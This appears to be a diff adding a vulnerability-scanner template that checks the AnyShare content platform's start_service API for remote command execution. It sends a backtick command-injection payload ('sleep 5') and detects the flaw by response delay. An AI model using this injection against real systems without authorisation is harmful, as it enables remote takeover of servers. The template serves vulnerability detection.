@@ -1,0 +1,39 @@
+id: anyshare-start_service-rce
+info:
+  name: 爱数AnyShare智能内容管理平台 start_service 存在远程命令执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E7%88%B1%E6%95%B0AnyShare/%E7%88%B1%E6%95%B0AnyShare%E6%99%BA%E8%83%BD%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20start_service%20%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md
+    - https://mp.weixin.qq.com/s/3hziurTDHqZJV5Cyeo4_Eg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,anyshare
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /api/ServiceAgent/start_service HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 38
+        Connection: close
+
+        ["`sleep 5`"]
+      
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
